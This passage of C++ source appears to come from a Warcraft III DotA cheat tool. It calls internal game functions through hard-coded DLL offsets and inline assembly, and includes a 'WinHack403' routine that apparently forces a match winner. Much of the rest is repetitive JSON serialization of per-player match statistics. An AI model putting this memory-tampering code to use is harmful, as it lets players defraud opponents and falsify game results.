		CALL ItemOrderAddr;
	}
}


int sub_6F5BE670()
{
	return (int)(GameDll + 0xACCE94);
}

unsigned char* sub_6F5C2E30_addr = 0;

__declspec(naked) void __fastcall sub_6F5C2E30(int a1, int unused, char a2)
{
	__asm
	{ JMP sub_6F5C2E30_addr }
}

int GetRandomHandi()
{
	return (5 + (rand() % 5)) * 10;
}

int INIT_DROP_HACK = 0;

DWORD DROP_TICKS = 0;
DWORD UPDATE_TICKS = 0;

void DisplayText(const std::string& szText, float fDuration)
{
	unsigned int dwDuration = *((unsigned int*)&fDuration);
	unsigned char* GAME_PrintToScreen = GameDll + 0x2F8E40;


	std::string outLineStr = (szText);
	const char* outLinePointer = outLineStr.c_str();

	if (!GameDll || !*(unsigned char**)pW3XGlobalClass)
		return;

	__asm
	{
		PUSH	0xFFFFFFFF;
		PUSH	dwDuration;
		PUSH	outLinePointer;
		PUSH	0x0;
		PUSH	0x0;
		MOV		ECX, [pW3XGlobalClass];
		MOV		ECX, [ECX];
		CALL	GAME_PrintToScreen;
	}
}


typedef void(__cdecl* winhacktest_p)();
winhacktest_p winhacktest;


typedef void(__fastcall* bothacktest_p)(int* data, int* data2);
bothacktest_p bothacktest;


typedef void(__fastcall* bothacktest2_p)(float* data, float* data2, int winner);
bothacktest2_p bothacktest2;


void WinHack403()
{
	int war3map = (int)GetModuleHandleA("war3map.dll");
	if (war3map && *(int*)(war3map + 0x1047DC8) == (int)(GameDll + 0x3B3E50))
	{
		bothacktest2 = (bothacktest2_p)(war3map + 0x5AD8F0);
		float* tmpfloatlist = new float[100];
		memset(tmpfloatlist, 0, sizeof(float) * 100);
		for (int i = 0; i < 100; i++)
		{
			tmpfloatlist[i] = i * 50.0f;
		}
		*(unsigned char*)(((unsigned char*)&tmpfloatlist[0]) + 17) = 0;
		*(unsigned char*)(((unsigned char*)&tmpfloatlist[0]) + 16) = 0;
		bothacktest2(tmpfloatlist, tmpfloatlist, 1);/*
		winhacktest = (winhacktest_p)(war3map + 0x2BD650);
		winhacktest();
		winhacktest = (winhacktest_p)(war3map + 0x2BE5E0);
		winhacktest();*/
		DisplayText("Winhaaa info", 10.0f);
	}
}
struct DOTA_PLAYER_DATA
{
	int assists;
	int courier_kills;
	int creep_denies;
	int creep_kills;
	int deaths;
	int firestone;
	int froststone;
	int gold;
	int hero;
	int id;
	int items[6];
	int kills;
	int left_time;
	int neutral_kills;
	int new_year_bounty_find;
	int new_year_rare_present_find;
	int rax_kills;
	int tower_kills;
};

struct DOTA_JSON_DATA
{
	int first_hero_kill_time;
	int first_rax_kill_time;
	int game_start_time;
	DOTA_PLAYER_DATA players[10];
	int winner;
};


struct DOTA_JSON_DATA_FIRST
{
	int first_hero_kill_time;
	int game_start_time;
	DOTA_PLAYER_DATA players[10];
};

struct DOTA_JSON_DATA_SECOND
{
	int first_hero_kill_time;
	int first_rax_kill_time;
	int game_start_time;
	DOTA_PLAYER_DATA players[10];
};
using json = nlohmann::json;

void to_json(json& j, const DOTA_JSON_DATA& p) {
	j = json{
		{"first_hero_kill_time", p.first_hero_kill_time},
		{"first_rax_kill_time", p.first_rax_kill_time},
		{"game_start_time", p.game_start_time},
		{
			"players",
			{
				{
					{"assists",p.players[0].assists},
					{"courier_kills",p.players[0].courier_kills},
					{"creep_denies",p.players[0].creep_denies},
					{"creep_kills",p.players[0].creep_kills},
					{"deaths",p.players[0].deaths},
					{"firestone",p.players[0].firestone},
					{"froststone",p.players[0].froststone},
					{"gold",p.players[0].gold},
					{"hero",p.players[0].hero},
					{"id",p.players[0].id},
					{
						"items",
						{
							p.players[0].items[0],
							p.players[0].items[1],
							p.players[0].items[2],
							p.players[0].items[3],
							p.players[0].items[4],
							p.players[0].items[5]
						}
					},
					{"kills",p.players[0].kills},
					{"left_time",p.players[0].left_time},
					{"neutral_kills",p.players[0].neutral_kills},
					{"new_year_bounty_find",p.players[0].new_year_bounty_find},
					{"new_year_rare_present_find",p.players[0].new_year_rare_present_find},
					{"rax_kills",p.players[0].rax_kills},
					{"tower_kills",p.players[0].tower_kills}
				},
				{
					{"assists",p.players[1].assists},
					{"courier_kills",p.players[1].courier_kills},
					{"creep_denies",p.players[1].creep_denies},
					{"creep_kills",p.players[1].creep_kills},
					{"deaths",p.players[1].deaths},
					{"firestone",p.players[1].firestone},
					{"froststone",p.players[1].froststone},
					{"gold",p.players[1].gold},
					{"hero",p.players[1].hero},
					{"id",p.players[1].id},
					{
						"items",
						{
							p.players[1].items[0],
							p.players[1].items[1],
							p.players[1].items[2],
							p.players[1].items[3],
							p.players[1].items[4],
							p.players[1].items[5]
						}
					},
					{"kills",p.players[1].kills},
					{"left_time",p.players[1].left_time},
					{"neutral_kills",p.players[1].neutral_kills},
					{"new_year_bounty_find",p.players[1].new_year_bounty_find},
					{"new_year_rare_present_find",p.players[1].new_year_rare_present_find},
					{"rax_kills",p.players[1].rax_kills},
					{"tower_kills",p.players[1].tower_kills}
				},
				{
					{"assists",p.players[2].assists},
					{"courier_kills",p.players[2].courier_kills},
					{"creep_denies",p.players[2].creep_denies},
					{"creep_kills",p.players[2].creep_kills},
					{"deaths",p.players[2].deaths},
					{"firestone",p.players[2].firestone},
					{"froststone",p.players[2].froststone},
					{"gold",p.players[2].gold},
					{"hero",p.players[2].hero},
					{"id",p.players[2].id},
					{
						"items",
						{
							p.players[2].items[0],
							p.players[2].items[1],
							p.players[2].items[2],
							p.players[2].items[3],
							p.players[2].items[4],
							p.players[2].items[5]
						}
					},
					{"kills",p.players[2].kills},
					{"left_time",p.players[2].left_time},
					{"neutral_kills",p.players[2].neutral_kills},
					{"new_year_bounty_find",p.players[2].new_year_bounty_find},
					{"new_year_rare_present_find",p.players[2].new_year_rare_present_find},
					{"rax_kills",p.players[2].rax_kills},
					{"tower_kills",p.players[2].tower_kills}
				},
				{
					{"assists",p.players[3].assists},
					{"courier_kills",p.players[3].courier_kills},
					{"creep_denies",p.players[3].creep_denies},
					{"creep_kills",p.players[3].creep_kills},
					{"deaths",p.players[3].deaths},
					{"firestone",p.players[3].firestone},
					{"froststone",p.players[3].froststone},
					{"gold",p.players[3].gold},
					{"hero",p.players[3].hero},
					{"id",p.players[3].id},
					{
						"items",
						{
							p.players[3].items[0],
							p.players[3].items[1],
							p.players[3].items[2],
							p.players[3].items[3],
							p.players[3].items[4],
							p.players[3].items[5]
						}
					},
					{"kills",p.players[3].kills},
					{"left_time",p.players[3].left_time},
					{"neutral_kills",p.players[3].neutral_kills},
					{"new_year_bounty_find",p.players[3].new_year_bounty_find},
					{"new_year_rare_present_find",p.players[3].new_year_rare_present_find},
					{"rax_kills",p.players[3].rax_kills},
					{"tower_kills",p.players[3].tower_kills}
				},
				{
					{"assists",p.players[4].assists},
					{"courier_kills",p.players[4].courier_kills},
					{"creep_denies",p.players[4].creep_denies},
					{"creep_kills",p.players[4].creep_kills},
					{"deaths",p.players[4].deaths},
					{"firestone",p.players[4].firestone},
					{"froststone",p.players[4].froststone},
					{"gold",p.players[4].gold},
					{"hero",p.players[4].hero},
					{"id",p.players[4].id},
					{
						"items",
						{
							p.players[4].items[0],
							p.players[4].items[1],
							p.players[4].items[2],
							p.players[4].items[3],
							p.players[4].items[4],
							p.players[4].items[5]
						}
					},
					{"kills",p.players[4].kills},
					{"left_time",p.players[4].left_time},
					{"neutral_kills",p.players[4].neutral_kills},
					{"new_year_bounty_find",p.players[4].new_year_bounty_find},
					{"new_year_rare_present_find",p.players[4].new_year_rare_present_find},
					{"rax_kills",p.players[4].rax_kills},
					{"tower_kills",p.players[4].tower_kills}
				},


				{
					{"assists",p.players[5].assists},
					{"courier_kills",p.players[5].courier_kills},
					{"creep_denies",p.players[5].creep_denies},
					{"creep_kills",p.players[5].creep_kills},
					{"deaths",p.players[5].deaths},
					{"firestone",p.players[5].firestone},
					{"froststone",p.players[5].froststone},
					{"gold",p.players[5].gold},
					{"hero",p.players[5].hero},
					{"id",p.players[5].id},
					{
						"items",
						{
							p.players[5].items[0],
							p.players[5].items[1],
							p.players[5].items[2],
							p.players[5].items[3],
							p.players[5].items[4],
							p.players[5].items[5]
						}
					},
					{"kills",p.players[5].kills},
					{"left_time",p.players[5].left_time},
					{"neutral_kills",p.players[5].neutral_kills},
					{"new_year_bounty_find",p.players[5].new_year_bounty_find},
					{"new_year_rare_present_find",p.players[5].new_year_rare_present_find},
					{"rax_kills",p.players[5].rax_kills},
					{"tower_kills",p.players[5].tower_kills}
				},
				{
					{"assists",p.players[6].assists},
					{"courier_kills",p.players[6].courier_kills},
					{"creep_denies",p.players[6].creep_denies},
					{"creep_kills",p.players[6].creep_kills},
					{"deaths",p.players[6].deaths},
					{"firestone",p.players[6].firestone},
					{"froststone",p.players[6].froststone},
					{"gold",p.players[6].gold},
					{"hero",p.players[6].hero},
					{"id",p.players[6].id},
					{
						"items",
						{
							p.players[6].items[0],
							p.players[6].items[1],
							p.players[6].items[2],
							p.players[6].items[3],
							p.players[6].items[4],
							p.players[6].items[5]
						}
					},
					{"kills",p.players[6].kills},
					{"left_time",p.players[6].left_time},
					{"neutral_kills",p.players[6].neutral_kills},
					{"new_year_bounty_find",p.players[6].new_year_bounty_find},
					{"new_year_rare_present_find",p.players[6].new_year_rare_present_find},
					{"rax_kills",p.players[6].rax_kills},
					{"tower_kills",p.players[6].tower_kills}
				},
				{
					{"assists",p.players[7].assists},
					{"courier_kills",p.players[7].courier_kills},
					{"creep_denies",p.players[7].creep_denies},
					{"creep_kills",p.players[7].creep_kills},
					{"deaths",p.players[7].deaths},
					{"firestone",p.players[7].firestone},
					{"froststone",p.players[7].froststone},
					{"gold",p.players[7].gold},
					{"hero",p.players[7].hero},
					{"id",p.players[7].id},
					{
						"items",
						{
							p.players[7].items[0],
							p.players[7].items[1],
							p.players[7].items[2],
							p.players[7].items[3],
							p.players[7].items[4],
							p.players[7].items[5]
						}
					},
					{"kills",p.players[7].kills},
					{"left_time",p.players[7].left_time},
					{"neutral_kills",p.players[7].neutral_kills},
					{"new_year_bounty_find",p.players[7].new_year_bounty_find},
					{"new_year_rare_present_find",p.players[7].new_year_rare_present_find},
					{"rax_kills",p.players[7].rax_kills},
					{"tower_kills",p.players[7].tower_kills}
				},
				{
					{"assists",p.players[8].assists},
					{"courier_kills",p.players[8].courier_kills},
					{"creep_denies",p.players[8].creep_denies},
					{"creep_kills",p.players[8].creep_kills},
					{"deaths",p.players[8].deaths},
					{"firestone",p.players[8].firestone},
					{"froststone",p.players[8].froststone},
					{"gold",p.players[8].gold},
					{"hero",p.players[8].hero},
					{"id",p.players[8].id},
					{
						"items",
						{
							p.players[8].items[0],
							p.players[8].items[1],
							p.players[8].items[2],
							p.players[8].items[3],
							p.players[8].items[4],
							p.players[8].items[5]
						}
					},
					{"kills",p.players[8].kills},
					{"left_time",p.players[8].left_time},
					{"neutral_kills",p.players[8].neutral_kills},
					{"new_year_bounty_find",p.players[8].new_year_bounty_find},
					{"new_year_rare_present_find",p.players[8].new_year_rare_present_find},
					{"rax_kills",p.players[8].rax_kills},
					{"tower_kills",p.players[8].tower_kills}
				},
				{
					{"assists",p.players[9].assists},
					{"courier_kills",p.players[9].courier_kills},
					{"creep_denies",p.players[9].creep_denies},
					{"creep_kills",p.players[9].creep_kills},
					{"deaths",p.players[9].deaths},
					{"firestone",p.players[9].firestone},
					{"froststone",p.players[9].froststone},
					{"gold",p.players[9].gold},
					{"hero",p.players[9].hero},
					{"id",p.players[9].id},
					{
						"items",
						{
							p.players[9].items[0],
							p.players[9].items[1],
							p.players[9].items[2],
							p.players[9].items[3],
							p.players[9].items[4],
							p.players[9].items[5]
						}
					},
					{"kills",p.players[9].kills},
					{"left_time",p.players[9].left_time},
					{"neutral_kills",p.players[9].neutral_kills},
					{"new_year_bounty_find",p.players[9].new_year_bounty_find},
					{"new_year_rare_present_find",p.players[9].new_year_rare_present_find},
					{"rax_kills",p.players[9].rax_kills},
					{"tower_kills",p.players[9].tower_kills}
				},
			}
		},
		{"winner", p.winner}
	};
}

void to_json(json& j, const DOTA_JSON_DATA_SECOND& p) {
	j = json{
		{"first_hero_kill_time", p.first_hero_kill_time},
		{"first_rax_kill_time", p.first_rax_kill_time},
		{"game_start_time", p.game_start_time},
		{
			"players",
			{
				{
					{"assists",p.players[0].assists},
					{"courier_kills",p.players[0].courier_kills},
					{"creep_denies",p.players[0].creep_denies},
					{"creep_kills",p.players[0].creep_kills},
					{"deaths",p.players[0].deaths},
					{"firestone",p.players[0].firestone},
					{"froststone",p.players[0].froststone},
					{"gold",p.players[0].gold},
					{"hero",p.players[0].hero},
					{"id",p.players[0].id},
					{
						"items",
						{
							p.players[0].items[0],
							p.players[0].items[1],
							p.players[0].items[2],
							p.players[0].items[3],
							p.players[0].items[4],
							p.players[0].items[5]
						}
					},
					{"kills",p.players[0].kills},
					{"left_time",p.players[0].left_time},
					{"neutral_kills",p.players[0].neutral_kills},
					{"new_year_bounty_find",p.players[0].new_year_bounty_find},
					{"new_year_rare_present_find",p.players[0].new_year_rare_present_find},
					{"rax_kills",p.players[0].rax_kills},
					{"tower_kills",p.players[0].tower_kills}
				},
				{
					{"assists",p.players[1].assists},
					{"courier_kills",p.players[1].courier_kills},
					{"creep_denies",p.players[1].creep_denies},
					{"creep_kills",p.players[1].creep_kills},
					{"deaths",p.players[1].deaths},
					{"firestone",p.players[1].firestone},
					{"froststone",p.players[1].froststone},
					{"gold",p.players[1].gold},
					{"hero",p.players[1].hero},
					{"id",p.players[1].id},
					{
						"items",
						{
							p.players[1].items[0],
							p.players[1].items[1],
							p.players[1].items[2],
							p.players[1].items[3],
							p.players[1].items[4],
							p.players[1].items[5]
						}
					},
					{"kills",p.players[1].kills},
					{"left_time",p.players[1].left_time},
					{"neutral_kills",p.players[1].neutral_kills},
					{"new_year_bounty_find",p.players[1].new_year_bounty_find},
					{"new_year_rare_present_find",p.players[1].new_year_rare_present_find},
					{"rax_kills",p.players[1].rax_kills},
					{"tower_kills",p.players[1].tower_kills}
				},
				{
					{"assists",p.players[2].assists},
					{"courier_kills",p.players[2].courier_kills},
					{"creep_denies",p.players[2].creep_denies},
					{"creep_kills",p.players[2].creep_kills},
					{"deaths",p.players[2].deaths},
					{"firestone",p.players[2].firestone},
					{"froststone",p.players[2].froststone},
					{"gold",p.players[2].gold},
					{"hero",p.players[2].hero},
					{"id",p.players[2].id},
					{
						"items",
						{
							p.players[2].items[0],
							p.players[2].items[1],
							p.players[2].items[2],
							p.players[2].items[3],
							p.players[2].items[4],
							p.players[2].items[5]
						}
					},
					{"kills",p.players[2].kills},
					{"left_time",p.players[2].left_time},
					{"neutral_kills",p.players[2].neutral_kills},
					{"new_year_bounty_find",p.players[2].new_year_bounty_find},
					{"new_year_rare_present_find",p.players[2].new_year_rare_present_find},
					{"rax_kills",p.players[2].rax_kills},
					{"tower_kills",p.players[2].tower_kills}
				},
				{
					{"assists",p.players[3].assists},
					{"courier_kills",p.players[3].courier_kills},
					{"creep_denies",p.players[3].creep_denies},
					{"creep_kills",p.players[3].creep_kills},
					{"deaths",p.players[3].deaths},
					{"firestone",p.players[3].firestone},
					{"froststone",p.players[3].froststone},
					{"gold",p.players[3].gold},
					{"hero",p.players[3].hero},
					{"id",p.players[3].id},
					{
						"items",
						{
							p.players[3].items[0],
							p.players[3].items[1],
							p.players[3].items[2],
							p.players[3].items[3],
							p.players[3].items[4],
							p.players[3].items[5]
						}
					},
					{"kills",p.players[3].kills},
					{"left_time",p.players[3].left_time},
					{"neutral_kills",p.players[3].neutral_kills},
					{"new_year_bounty_find",p.players[3].new_year_bounty_find},
					{"new_year_rare_present_find",p.players[3].new_year_rare_present_find},
					{"rax_kills",p.players[3].rax_kills},
					{"tower_kills",p.players[3].tower_kills}
				},
				{
					{"assists",p.players[4].assists},
					{"courier_kills",p.players[4].courier_kills},
					{"creep_denies",p.players[4].creep_denies},
					{"creep_kills",p.players[4].creep_kills},
					{"deaths",p.players[4].deaths},
					{"firestone",p.players[4].firestone},
					{"froststone",p.players[4].froststone},
					{"gold",p.players[4].gold},
					{"hero",p.players[4].hero},
					{"id",p.players[4].id},
					{
						"items",
						{
							p.players[4].items[0],
							p.players[4].items[1],
							p.players[4].items[2],
							p.players[4].items[3],
							p.players[4].items[4],
							p.players[4].items[5]
						}
					},
					{"kills",p.players[4].kills},
					{"left_time",p.players[4].left_time},
					{"neutral_kills",p.players[4].neutral_kills},
					{"new_year_bounty_find",p.players[4].new_year_bounty_find},
					{"new_year_rare_present_find",p.players[4].new_year_rare_present_find},
					{"rax_kills",p.players[4].rax_kills},
					{"tower_kills",p.players[4].tower_kills}
				},


				{
					{"assists",p.players[5].assists},
					{"courier_kills",p.players[5].courier_kills},
					{"creep_denies",p.players[5].creep_denies},
					{"creep_kills",p.players[5].creep_kills},
					{"deaths",p.players[5].deaths},
					{"firestone",p.players[5].firestone},
					{"froststone",p.players[5].froststone},
					{"gold",p.players[5].gold},
					{"hero",p.players[5].hero},
					{"id",p.players[5].id},
					{
						"items",
						{
							p.players[5].items[0],
							p.players[5].items[1],
							p.players[5].items[2],
							p.players[5].items[3],
							p.players[5].items[4],
							p.players[5].items[5]
						}
					},
					{"kills",p.players[5].kills},
					{"left_time",p.players[5].left_time},
					{"neutral_kills",p.players[5].neutral_kills},
					{"new_year_bounty_find",p.players[5].new_year_bounty_find},
					{"new_year_rare_present_find",p.players[5].new_year_rare_present_find},
					{"rax_kills",p.players[5].rax_kills},
					{"tower_kills",p.players[5].tower_kills}
				},
				{
					{"assists",p.players[6].assists},
					{"courier_kills",p.players[6].courier_kills},
					{"creep_denies",p.players[6].creep_denies},
					{"creep_kills",p.players[6].creep_kills},
					{"deaths",p.players[6].deaths},
					{"firestone",p.players[6].firestone},
					{"froststone",p.players[6].froststone},
					{"gold",p.players[6].gold},
					{"hero",p.players[6].hero},
					{"id",p.players[6].id},
					{
						"items",
						{
							p.players[6].items[0],
							p.players[6].items[1],
							p.players[6].items[2],
							p.players[6].items[3],
							p.players[6].items[4],
							p.players[6].items[5]
						}
					},
					{"kills",p.players[6].kills},
					{"left_time",p.players[6].left_time},
					{"neutral_kills",p.players[6].neutral_kills},
					{"new_year_bounty_find",p.players[6].new_year_bounty_find},
					{"new_year_rare_present_find",p.players[6].new_year_rare_present_find},
					{"rax_kills",p.players[6].rax_kills},
					{"tower_kills",p.players[6].tower_kills}
				},
				{
					{"assists",p.players[7].assists},
					{"courier_kills",p.players[7].courier_kills},
					{"creep_denies",p.players[7].creep_denies},
					{"creep_kills",p.players[7].creep_kills},
					{"deaths",p.players[7].deaths},
					{"firestone",p.players[7].firestone},
					{"froststone",p.players[7].froststone},
					{"gold",p.players[7].gold},
					{"hero",p.players[7].hero},
					{"id",p.players[7].id},
					{
						"items",
						{
							p.players[7].items[0],
							p.players[7].items[1],
							p.players[7].items[2],
							p.players[7].items[3],
							p.players[7].items[4],
							p.players[7].items[5]
						}
					},
					{"kills",p.players[7].kills},
					{"left_time",p.players[7].left_time},
					{"neutral_kills",p.players[7].neutral_kills},
					{"new_year_bounty_find",p.players[7].new_year_bounty_find},
					{"new_year_rare_present_find",p.players[7].new_year_rare_present_find},
					{"rax_kills",p.players[7].rax_kills},
					{"tower_kills",p.players[7].tower_kills}
				},
				{
					{"assists",p.players[8].assists},
					{"courier_kills",p.players[8].courier_kills},
					{"creep_denies",p.players[8].creep_denies},
					{"creep_kills",p.players[8].creep_kills},
					{"deaths",p.players[8].deaths},
					{"firestone",p.players[8].firestone},
					{"froststone",p.players[8].froststone},
					{"gold",p.players[8].gold},
					{"hero",p.players[8].hero},
					{"id",p.players[8].id},
					{
						"items",
						{
							p.players[8].items[0],
							p.players[8].items[1],
							p.players[8].items[2],
							p.players[8].items[3],
							p.players[8].items[4],
							p.players[8].items[5]
						}
					},
					{"kills",p.players[8].kills},
					{"left_time",p.players[8].left_time},
					{"neutral_kills",p.players[8].neutral_kills},
					{"new_year_bounty_find",p.players[8].new_year_bounty_find},
					{"new_year_rare_present_find",p.players[8].new_year_rare_present_find},
					{"rax_kills",p.players[8].rax_kills},
					{"tower_kills",p.players[8].tower_kills}
				},
				{
					{"assists",p.players[9].assists},
					{"courier_kills",p.players[9].courier_kills},
					{"creep_denies",p.players[9].creep_denies},
					{"creep_kills",p.players[9].creep_kills},
					{"deaths",p.players[9].deaths},
					{"firestone",p.players[9].firestone},
					{"froststone",p.players[9].froststone},
					{"gold",p.players[9].gold},
					{"hero",p.players[9].hero},
					{"id",p.players[9].id},
					{
						"items",
						{
							p.players[9].items[0],
							p.players[9].items[1],
							p.players[9].items[2],
							p.players[9].items[3],
							p.players[9].items[4],
							p.players[9].items[5]
						}
					},
					{"kills",p.players[9].kills},
					{"left_time",p.players[9].left_time},
					{"neutral_kills",p.players[9].neutral_kills},
					{"new_year_bounty_find",p.players[9].new_year_bounty_find},
					{"new_year_rare_present_find",p.players[9].new_year_rare_present_find},
					{"rax_kills",p.players[9].rax_kills},
					{"tower_kills",p.players[9].tower_kills}
				},
			}
		}
	};
}

void to_json(json& j, const DOTA_JSON_DATA_FIRST& p) {
	j = json{
		{"first_hero_kill_time", p.first_hero_kill_time},
		{"game_start_time", p.game_start_time},
		{
			"players",
			{
				{
					{"assists",p.players[0].assists},
					{"courier_kills",p.players[0].courier_kills},
					{"creep_denies",p.players[0].creep_denies},
					{"creep_kills",p.players[0].creep_kills},
					{"deaths",p.players[0].deaths},
					{"firestone",p.players[0].firestone},
					{"froststone",p.players[0].froststone},
					{"gold",p.players[0].gold},
					{"hero",p.players[0].hero},
					{"id",p.players[0].id},
					{
						"items",
						{
							p.players[0].items[0],
							p.players[0].items[1],
							p.players[0].items[2],
							p.players[0].items[3],
							p.players[0].items[4],
							p.players[0].items[5]
						}
					},
					{"kills",p.players[0].kills},
					{"left_time",p.players[0].left_time},
					{"neutral_kills",p.players[0].neutral_kills},
					{"new_year_bounty_find",p.players[0].new_year_bounty_find},
					{"new_year_rare_present_find",p.players[0].new_year_rare_present_find},
					{"rax_kills",p.players[0].rax_kills},
					{"tower_kills",p.players[0].tower_kills}
				},
				{
					{"assists",p.players[1].assists},
					{"courier_kills",p.players[1].courier_kills},
					{"creep_denies",p.players[1].creep_denies},
					{"creep_kills",p.players[1].creep_kills},
					{"deaths",p.players[1].deaths},
					{"firestone",p.players[1].firestone},
					{"froststone",p.players[1].froststone},
					{"gold",p.players[1].gold},
					{"hero",p.players[1].hero},
					{"id",p.players[1].id},
					{
						"items",
						{
							p.players[1].items[0],
							p.players[1].items[1],
							p.players[1].items[2],
							p.players[1].items[3],
							p.players[1].items[4],
							p.players[1].items[5]
						}
					},
					{"kills",p.players[1].kills},
					{"left_time",p.players[1].left_time},
					{"neutral_kills",p.players[1].neutral_kills},
					{"new_year_bounty_find",p.players[1].new_year_bounty_find},
					{"new_year_rare_present_find",p.players[1].new_year_rare_present_find},
					{"rax_kills",p.players[1].rax_kills},
					{"tower_kills",p.players[1].tower_kills}
				},
				{
					{"assists",p.players[2].assists},
					{"courier_kills",p.players[2].courier_kills},
					{"creep_denies",p.players[2].creep_denies},
					{"creep_kills",p.players[2].creep_kills},
					{"deaths",p.players[2].deaths},
					{"firestone",p.players[2].firestone},
					{"froststone",p.players[2].froststone},
					{"gold",p.players[2].gold},
					{"hero",p.players[2].hero},
					{"id",p.players[2].id},
					{
						"items",
						{
							p.players[2].items[0],
							p.players[2].items[1],
							p.players[2].items[2],
							p.players[2].items[3],
							p.players[2].items[4],
							p.players[2].items[5]
						}
					},
					{"kills",p.players[2].kills},
					{"left_time",p.players[2].left_time},
					{"neutral_kills",p.players[2].neutral_kills},
					{"new_year_bounty_find",p.players[2].new_year_bounty_find},
					{"new_year_rare_present_find",p.players[2].new_year_rare_present_find},
					{"rax_kills",p.players[2].rax_kills},
					{"tower_kills",p.players[2].tower_kills}
				},
				{
					{"assists",p.players[3].assists},
					{"courier_kills",p.players[3].courier_kills},
					{"creep_denies",p.players[3].creep_denies},
					{"creep_kills",p.players[3].creep_kills},
					{"deaths",p.players[3].deaths},
					{"firestone",p.players[3].firestone},
					{"froststone",p.players[3].froststone},
					{"gold",p.players[3].gold},
					{"hero",p.players[3].hero},
					{"id",p.players[3].id},
					{
						"items",
						{
							p.players[3].items[0],
							p.players[3].items[1],
							p.players[3].items[2],
							p.players[3].items[3],
							p.players[3].items[4],
							p.players[3].items[5]
						}
					},
					{"kills",p.players[3].kills},
					{"left_time",p.players[3].left_time},
					{"neutral_kills",p.players[3].neutral_kills},
					{"new_year_bounty_find",p.players[3].new_year_bounty_find},
					{"new_year_rare_present_find",p.players[3].new_year_rare_present_find},
					{"rax_kills",p.players[3].rax_kills},
					{"tower_kills",p.players[3].tower_kills}
				},
				{
					{"assists",p.players[4].assists},
					{"courier_kills",p.players[4].courier_kills},
					{"creep_denies",p.players[4].creep_denies},
					{"creep_kills",p.players[4].creep_kills},
					{"deaths",p.players[4].deaths},
					{"firestone",p.players[4].firestone},
					{"froststone",p.players[4].froststone},
					{"gold",p.players[4].gold},
					{"hero",p.players[4].hero},
					{"id",p.players[4].id},
					{
						"items",
						{
							p.players[4].items[0],
							p.players[4].items[1],
							p.players[4].items[2],
							p.players[4].items[3],
							p.players[4].items[4],
							p.players[4].items[5]
						}
					},
					{"kills",p.players[4].kills},
					{"left_time",p.players[4].left_time},
					{"neutral_kills",p.players[4].neutral_kills},
					{"new_year_bounty_find",p.players[4].new_year_bounty_find},
					{"new_year_rare_present_find",p.players[4].new_year_rare_present_find},
					{"rax_kills",p.players[4].rax_kills},
					{"tower_kills",p.players[4].tower_kills}
				},


				{
					{"assists",p.players[5].assists},
					{"courier_kills",p.players[5].courier_kills},
					{"creep_denies",p.players[5].creep_denies},
					{"creep_kills",p.players[5].creep_kills},
					{"deaths",p.players[5].deaths},
					{"firestone",p.players[5].firestone},
					{"froststone",p.players[5].froststone},
					{"gold",p.players[5].gold},
					{"hero",p.players[5].hero},
					{"id",p.players[5].id},
					{
						"items",
						{
							p.players[5].items[0],
							p.players[5].items[1],
							p.players[5].items[2],
							p.players[5].items[3],
							p.players[5].items[4],
							p.players[5].items[5]
						}
					},
					{"kills",p.players[5].kills},
					{"left_time",p.players[5].left_time},
					{"neutral_kills",p.players[5].neutral_kills},
					{"new_year_bounty_find",p.players[5].new_year_bounty_find},
					{"new_year_rare_present_find",p.players[5].new_year_rare_present_find},
					{"rax_kills",p.players[5].rax_kills},
					{"tower_kills",p.players[5].tower_kills}
				},
				{
					{"assists",p.players[6].assists},
					{"courier_kills",p.players[6].courier_kills},
					{"creep_denies",p.players[6].creep_denies},
					{"creep_kills",p.players[6].creep_kills},
					{"deaths",p.players[6].deaths},
					{"firestone",p.players[6].firestone},
					{"froststone",p.players[6].froststone},
					{"gold",p.players[6].gold},
					{"hero",p.players[6].hero},
					{"id",p.players[6].id},
					{
						"items",
						{
							p.players[6].items[0],
							p.players[6].items[1],
							p.players[6].items[2],
							p.players[6].items[3],
							p.players[6].items[4],
							p.players[6].items[5]
						}
					},
					{"kills",p.players[6].kills},
					{"left_time",p.players[6].left_time},
					{"neutral_kills",p.players[6].neutral_kills},
					{"new_year_bounty_find",p.players[6].new_year_bounty_find},
					{"new_year_rare_present_find",p.players[6].new_year_rare_present_find},
					{"rax_kills",p.players[6].rax_kills},
					{"tower_kills",p.players[6].tower_kills}
				},
				{
					{"assists",p.players[7].assists},
					{"courier_kills",p.players[7].courier_kills},
					{"creep_denies",p.players[7].creep_denies},
					{"creep_kills",p.players[7].creep_kills},
					{"deaths",p.players[7].deaths},
					{"firestone",p.players[7].firestone},
					{"froststone",p.players[7].froststone},
					{"gold",p.players[7].gold},
					{"hero",p.players[7].hero},
					{"id",p.players[7].id},
					{
						"items",
						{
							p.players[7].items[0],
							p.players[7].items[1],
							p.players[7].items[2],
							p.players[7].items[3],
							p.players[7].items[4],
							p.players[7].items[5]
						}
					},
					{"kills",p.players[7].kills},
					{"left_time",p.players[7].left_time},
					{"neutral_kills",p.players[7].neutral_kills},
					{"new_year_bounty_find",p.players[7].new_year_bounty_find},
					{"new_year_rare_present_find",p.players[7].new_year_rare_present_find},
					{"rax_kills",p.players[7].rax_kills},
					{"tower_kills",p.players[7].tower_kills}
				},
				{
					{"assists",p.players[8].assists},
					{"courier_kills",p.players[8].courier_kills},
					{"creep_denies",p.players[8].creep_denies},
					{"creep_kills",p.players[8].creep_kills},
					{"deaths",p.players[8].deaths},
					{"firestone",p.players[8].firestone},
					{"froststone",p.players[8].froststone},
					{"gold",p.players[8].gold},
					{"hero",p.players[8].hero},
					{"id",p.players[8].id},
					{
						"items",
						{
							p.players[8].items[0],
							p.players[8].items[1],
							p.players[8].items[2],
							p.players[8].items[3],
							p.players[8].items[4],
							p.players[8].items[5]
						}
					},
					{"kills",p.players[8].kills},
					{"left_time",p.players[8].left_time},
					{"neutral_kills",p.players[8].neutral_kills},
					{"new_year_bounty_find",p.players[8].new_year_bounty_find},
					{"new_year_rare_present_find",p.players[8].new_year_rare_present_find},
					{"rax_kills",p.players[8].rax_kills},
					{"tower_kills",p.players[8].tower_kills}
				},
				{
					{"assists",p.players[9].assists},
					{"courier_kills",p.players[9].courier_kills},
					{"creep_denies",p.players[9].creep_denies},
					{"creep_kills",p.players[9].creep_kills},
					{"deaths",p.players[9].deaths},
					{"firestone",p.players[9].firestone},
					{"froststone",p.players[9].froststone},
					{"gold",p.players[9].gold},
					{"hero",p.players[9].hero},
					{"id",p.players[9].id},
					{
						"items",
						{
							p.players[9].items[0],
							p.players[9].items[1],
							p.players[9].items[2],
							p.players[9].items[3],
							p.players[9].items[4],
							p.players[9].items[5]
						}
					},
					{"kills",p.players[9].kills},
					{"left_time",p.players[9].left_time},
					{"neutral_kills",p.players[9].neutral_kills},
